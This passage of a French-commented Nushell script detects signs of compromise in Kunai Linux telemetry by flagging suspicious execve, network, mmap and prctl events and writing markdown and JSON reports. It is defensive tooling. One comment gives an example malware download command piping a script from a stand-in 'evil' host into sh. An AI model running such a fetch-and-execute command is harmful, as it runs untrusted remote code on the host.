    | (unnestif $in exe) | (unnestif $in mapped)
    # selon le format kunai le chemin est exposé `mapped.path` (→ mapped_path)
    # ou, en plus ancien, directement `mapped_file`. On normalise vers mapped_path.
    | (normalize_mapped $in)
    | polars filter ((polars col mapped_path) | polars is-not-null)
    | (cols_keep [utc_time task_name task_pid command_line mapped_path])
    | polars with-column (
        (polars when $c_susp (polars lit "mmap_exec_suspicious")
         | polars otherwise (polars lit "none"))
        | polars as evidence)
    | polars filter ((polars col evidence) != 'none')
}

# =====================================================================
# ---- FAMILLE prctl : évasion (dumpable / seccomp) --------------------
# =====================================================================
export def detect_prctl [base] {
    # Règle générique pot commun (cf. set_dumpable.prctl.detection.yaml, T1622).
    let c_dump = (r_prctl_dumpable)
    if (not (has_events $base 'prctl')) { return (empty_like $base) }

    $base
    | ev 'prctl'
    | polars filter (not_legit)
    | polars select [utc_time task_name task_pid command_line option arg2 arg3 arg4 arg5]
    | polars with-column (
        (polars when $c_dump (polars lit "dumpable_change")
         | polars otherwise (polars lit "none"))
        | polars as evidence)
    | polars filter ((polars col evidence) != 'none')
}

# =====================================================================
# ---- Affichage d'une famille : dataframe nu --------------------------
# =====================================================================
export def show_family [base, family: string, num: int, explore: bool] {
    let l2 = (match $family {
        'execve'        => (detect_execve $base)
        'file_create'   => (detect_file_create $base)
        'connect'       => (detect_connect $base)
        'send_data'     => (detect_send_data $base)
        'dns_query'     => (detect_dns_query $base)
        'kill'          => (detect_kill $base)
        'bpf_prog_load' => (detect_bpf $base)
        'mmap_exec'     => (detect_mmap_exec $base)
        'prctl'         => (detect_prctl $base)
        _ => { error make { msg: $"famille inconnue: ($family)" } }
    })
    let rows = ($l2 | polars collect | polars into-nu)
    let n = ($rows | length)
    print $"(ansi green)≡≡  Famille: ($family)   —  ($n) alertes(ansi reset)"
    if (($rows | length) > 0) {
        if $explore {
            $rows | polars into-df | explore
        } else {
            $rows | first $num | table -e
        }
    }
    print ""
}

# =====================================================================
# ---- Bilan : IP / ports / URLs de téléchargement --------------------
# =====================================================================
# Construit un bilan consolidé à partir des familles réseau et fichiers déjà
# détectées. Renvoie une liste de lignes markdown à intégrer au rapport :
#   - IP de destination (publiques / egress) et ports contactés, dédupliqués,
#     avec le nombre de connexions ;
#   - URLs et commandes de téléchargement de malware (curl/wget … piped) et
#     fichiers déposés (binaires dans /tmp, /dev/shm, …).
# Fonctionne en autonome depuis le base brut (re-détecte les familles utiles).
export def report_bilan [base, num: int = 50] {
    let connects = (detect_connect $base | polars collect | polars into-nu)
    let sends    = (detect_send_data $base | polars collect | polars into-nu)
    let execves  = (detect_execve $base | polars collect | polars into-nu)
    let files    = (detect_file_create $base | polars collect | polars into-nu)
    bilan_sections $connects $sends $execves $files $num
}

# Version "interne" de report_bilan : prend directement les dataframes nushell
# déjà détectées (connect, send_data, execve, file_create) pour éviter de
# re-détecter les familles quand on les a déjà comptées (ex. rendu d'un rapport).
def bilan_sections [
    connects: list
    sends: list
    execves: list
    files: list
    num: int
] {
    let data = (bilan_data $connects $sends $execves $files $num)
    mut lines = [ "## Bilan — IP, ports et téléchargements" "" ]

    $lines = ($lines | append "### IP / ports détectés")
    if ($data.ipports | is-empty) {
        $lines = ($lines | append "_Aucune connexion sortante suspecte détectée._")
    } else {
        $lines = ($lines | append [ "| IP | Port | Connexions |" "|---|---|---|" ])
        for r in ($data.ipports | first $num) {
            $lines = ($lines | append $"| ($r.ip) | ($r.port) | ($r.count) |")
        }
        if ($data.ipports | length) > $num {
            $lines = ($lines | append $"… et (($data.ipports | length) - $num) autres couples IP:port")
        }
    }
    $lines = ($lines | append "")

    $lines = ($lines | append "### URLs de téléchargement")
    if ($data.urls | is-empty) {
        $lines = ($lines | append "_Aucune URL de téléchargement détectée dans les commandes._")
    } else {
        for u in ($data.urls | first $num) { $lines = ($lines | append $"- `($u)`") }
    }
    $lines = ($lines | append "")

    $lines = ($lines | append "### Fichiers déposés / persistants")
    if ($data.files | is-empty) {
        $lines = ($lines | append "_Aucun fichier suspect déposé._")
    } else {
        for p in ($data.files | first $num) { $lines = ($lines | append $"- `($p)`") }
    }
    $lines = ($lines | append "")

    $lines
}

# Version structurée (pour le rapport JSON) du bilan : à partir des dataframes
# connect / send_data / execve / file_create déjà détectées, calcule :
#   - ipports : couples ip:port contactés avec leur nb de connexions (triés) ;
#   - urls    : URLs http(s) extraites des command lines (téléchargements) ;
#   - files   : main_path (fichiers déposés / persistants).
def bilan_data [
    connects: list
    sends: list
    execves: list
    files: list
    num: int
] {
    # ---- 1. IP/port contactés (egress public + ports inhabituels) ----
    let ipports = ((
            $connects | select dst_ip dst_port
        ) | append ($sends | select dst_ip dst_port))
    let ip_by_port = ($ipports
        | group-by {|r| $"(($r.dst_ip | into string)):($r.dst_port)" }
        | items {|k, rows|
            { ip: ($rows.0.dst_ip | into string)
              port: ($rows.0.dst_port | into int)
              count: ($rows | length) } }
        | sort-by count --reverse
        | first $num)

    # ---- 2. URLs de téléchargement de malware ----
    # Extraction des URLs http(s) dans les command lines des alertes execve,
    # connect, send_data (ex. "curl http://evil/p.sh | sh").
    let urls = (
        ($execves | get command_line)
        | append ($connects | get command_line)
        | append ($sends | get command_line)
        | each {|c|
            ($c | split row ' '
                | where {|w| ($w | str starts-with 'http') }
                | each {|w| $w | str trim -c '"' | str trim -c "'" })
          }
        | flatten
        | where {|w| not ($w | is-empty) }
        | uniq
    )

    # ---- 3. Fichiers déposés (drop-and-run, persistance) ----
    let file_cols = ($files | columns)
    let files_deposes = if ("main_path" not-in $file_cols) or ($files | is-empty) {
        []
    } else {
        ($files | get main_path | uniq | first $num)
    }

    { ipports: $ip_by_port, urls: $urls, files: $files_deposes }
}

# =====================================================================
# ---- Rendu d'un rapport complet (familles + bilan) ------------------
# =====================================================================
# Détecte l'ensemble des familles UNE seule fois, compte les alertes par famille
# et construit tout le rapport : le markdown ET les données structurées (utiles
# au rendu JSON).
# Renvoie { md, fam_counts, data, bilan } :
#   - md         : lignes markdown à écrire dans le fichier,
#   - fam_counts : nb d'alertes par famille (pour le nom descriptif),
#   - data       : record fam -> liste COMPLÈTE des détections (chaque famille
#                  matérialisée une seule fois),
#   - bilan      : structure { ipports, urls, files } pour le rapport JSON.
# max_rows borne le nombre de lignes AFFICHÉES dans le markdown (au-delà décompte
# seul) ; le JSON, lui, embarque toutes les détections.
export def render_report [base, max_rows: int = 25] {
    # Matérialise chaque famille UNE fois en mémoire (liste nu) ; on en dérive
    # ensuite le décompte, les max_rows du markdown et la liste complète du JSON.
    let data = {
        execve:        (detect_execve $base | polars collect | polars into-nu)
        file_create:   (detect_file_create $base | polars collect | polars into-nu)
        connect:       (detect_connect $base | polars collect | polars into-nu)
        send_data:     (detect_send_data $base | polars collect | polars into-nu)
        dns_query:     (detect_dns_query $base | polars collect | polars into-nu)
        kill:          (detect_kill $base | polars collect | polars into-nu)
        bpf_prog_load: (detect_bpf $base | polars collect | polars into-nu)
        mmap_exec:     (detect_mmap_exec $base | polars collect | polars into-nu)
        prctl:         (detect_prctl $base | polars collect | polars into-nu)
    }

    let fam_counts = ($data | items {|fam, rows| { $fam: ($rows | length) } }
        | reduce -f {} {|it, acc| $acc | merge $it })

    mut md = []
    for fam in (report_families) {
        let n = ($fam_counts | get $fam)
        $md = ($md | append $"## ($fam) — ($n) alertes" "")
        if $n > 0 {
            $md = ($md | append (($data | get $fam | first $max_rows | to md) | split row "\n"))
            let more = $n - $max_rows
            if $more > 0 { $md = ($md | append $"… et ($more) autres alertes non affichées") }
        }
        $md = ($md | append "")
    }

    # Bilan (IP/ports, URLs, fichiers) réutilise les dataframes déjà détectées.
    let bilan = (bilan_data ($data.connect) ($data.send_data) ($data.execve) ($data.file_create) 50)
    $md = ($md | append (bilan_sections ($data.connect) ($data.send_data) ($data.execve) ($data.file_create) 50))

    { md: $md, fam_counts: $fam_counts, data: $data, bilan: $bilan }
}

# Écrit le rapport d'un échantillon dans logs/ngsoti/scanresult<TS>/<nom>.md ET
# <nom>.json (JSON activé par défaut; --no-json pour n'écrire que le markdown),
# à côté du fichier d'entrée.
# Le TS est passé par le wrapper (unique pour toute une session) ; sinon généré.
# Le nom du fichier est délégué à report_basename (descriptif depuis les familles).
export def write_report [base, file: string, ts?: string, --no-json] {
    let ts = ($ts | default (date now | format date "%Y%m%d_%H%M%S"))
    let rep = (render_report $base 25)
    let json = (not $no_json)

    let log_dir = ($file | path dirname | path dirname)
    let out_dir = ($log_dir | path join $"scanresult($ts)")
    mkdir $out_dir
    let hash = ($file | path dirname | path basename)
    let base_name = (report_basename $hash $rep.fam_counts)

    let out_md = ($out_dir | path join $"($base_name).md")
    $rep.md | str join "\n" | save --force $out_md

    # Rapport JSON structuré (détections complètes + bilan + métadonnées).
    if $json {
        let out_json = ($out_dir | path join $"($base_name).json")
        (report_json $file $ts $rep) | to json | save --force $out_json
        { md: $out_md, json: $out_json, fam_counts: $rep.fam_counts }
    } else {
        { md: $out_md, fam_counts: $rep.fam_counts }
    }
}

# Assemble le contenu structuré du rapport JSON : métadonnées (source, hash court,
# timestamp), décompte par famille, listes complètes des détections par famille
# et bilan (IP/ports, URLs, fichiers déposés).
export def report_json [file: string, ts: string, rep: record] {
    let hash = ($file | path dirname | path basename)
    {
        schema_version: 1,
        generated_at: (date now | format date "%Y-%m-%dT%H:%M:%S%z"),
        scan_ts: $ts,
        sample: {
            file: ($file | path expand),
            hash: $hash,
            short_hash: ($hash | str substring 0..7),
        },
        fam_counts: $rep.fam_counts,
        families: $rep.data,
        bilan: $rep.bilan,
    }
}

# =====================================================================
# ---- Nommage des rapports -------------------------------------------
# =====================================================================
# Liste canonique des familles de détection (triée) : utilisée pour construire
# le nom descriptif d'un rapport. Toute famille de détection vit ici, au niveau
# de la procédure de détection, pas dans les wrappers.
export def report_families [] {
    ['execve','file_create','connect','send_data','dns_query','kill',
     'bpf_prog_load','mmap_exec','prctl']
}

# Nom descriptif d'un rapport, construit à partir des familles de détection
# DÉTECTÉES (famille+nombre d'alertes), précédées du hash court de l'échantillon.
# Reçoit le hash source et le nb d'alertes par famille (record fam -> n).
# Ex : 15e67237_execve1_connect35_send_data9286_dns_query2_prctl3.md
export def report_basename [hash: string, fam_counts: record] {
    let short = ($hash | str substring 0..7)
    let sig = ($fam_counts
        | items {|fam, n| if ($n | into int) > 0 { $"($fam)($n)" } else { null } }
        | where {|v| $v != null }
        | str join "_")
    let label = if ($sig | is-empty) { "aucune_alerte" } else { $sig }
    $"($short)_($label)"
}

# =====================================================================
# ---- MAIN ------------------------------------------------------------
# =====================================================================
def main [
    ...files: string
    --infer-schema: int = 200000
    --num (-n): int = 20                 # nb de lignes affichées par famille
    --family (-f): string = "all"        # all ou une famille
    --explore (-x)                       # affichage dataframe interactif
    --no-json                            # n'écrire que le markdown (pas de .json)
    --no-convert                         # désactiver la conversion auto gz/jsonl->parquet
    --force-convert                      # reconvertir même si le cache parquet est à jour
    --cache-dir: string                  # dossier pour les parquet de conversion (défaut : à côté de la source)
    --profile (-p): string               # profil local_cfg (hostname par défaut, ex. "elastic")
] {
    # Sélection du profil de config locale : --profile explicite > $env.KUNAI_PROFILE
    # > hostname (géré dans kunai_local_cfg.nu/load_cfg). On propage le --profile au
    # module importé via la variable d'env partagée dans le même process.
    if ($profile | is-not-empty) { $env.KUNAI_PROFILE = $profile }

    # fichiers par défaut : les 2 .gz les plus récents du registry.
    # On exclut toujours le fichier vivant `events.log` (log non compressé en cours
    # d'écriture), en plus du filtre sur l'extension .gz.
    let registry_dir = "/run/media/pouchou/SSD2T/ips-ids-siem-pcaps/kunai/kunai_registry/kunai"
    let file_list = if (($files | is-empty)) {
        (ls $registry_dir
            | where { |e|
                let n = ($e.name | path basename)
                $n != 'events.log' and (($n | str ends-with '.gz') or ($n | str ends-with '.parquet'))
            }
            | sort-by modified
            | last 2
            | get name
            | path expand)
    } else { $files }

    let nf = ($file_list | length)
    print $"(ansi cyan)🔍 Détection de compromission — ($nf) fichiers(ansi reset)"

    # Timestamp unique de session : tous les échantillons partagent le même
    # dossier scanresult<TS> (comme les wrappers ngsoti_all/ngsoti_detail).
    let scan_ts = (date now | format date "%Y%m%d_%H%M%S")

    let families = if $family == 'all' {
        ['execve','file_create','connect','send_data','dns_query','kill','bpf_prog_load','mmap_exec','prctl']
    } else { [$family] }

    for file in $file_list {
        if not (($file | path exists)) {
            print $"(ansi yellow)⚠ fichier introuvable: ($file)(ansi reset)"
            continue
        }
        # intégrité du .gz (fichier en cours d'écriture / tronqué) — uniquement
        # pour les fichiers compressés, pas pour un .jsonl brut (cas de test).
        if ($file | path parse | get extension) == 'gz' {
            let res = (^gzip -t $file | complete)
            if $res.exit_code != 0 {
                print $"(ansi yellow)⚠ fichier tronqué/incomplet, ignoré: ($file)(ansi reset)"
                continue
            }
        }
        # Conversion automatique gz/jsonl -> parquet (par défaut) avant analyse,
        # sauf si --no-convert. build_base lit le parquet résultant, bien plus
        # rapide que de reparser l'ndjson intact à chaque exécution.
        let eff = if $no_convert {
            { file: $file, converted: false }
        } else {
            ensure_parquet $file $infer_schema --force=$force_convert --cache-dir=$cache_dir
        }
        let base = (build_base $eff.file $infer_schema)
        let badge = if $eff.converted {
            $"(ansi yellow) [converti → ($eff.file)](ansi reset)"
        } else if not $no_convert and ($eff.file != $file) {
            $"(ansi yellow) [parquet cache: ($eff.file)](ansi reset)"
        } else { "" }
        print $"(ansi cyan)┌─ Fichier: ($file)($badge) ───────────────────────┐(ansi reset)"
        for fam in $families {
            show_family $base $fam $num $explore
        }
        # Écrit aussi le rapport markdown (+ JSON par défaut) dans scanresult<TS>/
        # (même mécanisme que ngsoti_detail.nu) pour que l'invocation directe
        # produise bien des fichiers de sortie, pas seulement un affichage console.
        # On passe la SOURCE ($file) pour le hash/dossier, indépendamment de la
        # conversion (le parquet cache peut vivre ailleurs avec --cache-dir).
        let wrote = (write_report $base $file $scan_ts --no-json=$no_json)
        if $no_json {
            print $"(ansi cyan)Rapport écrit : ($wrote.md)(ansi reset)"
        } else {
            print $"(ansi cyan)Rapport écrit : ($wrote.md)\nJSON : ($wrote.json)(ansi reset)"
        }
    }
}
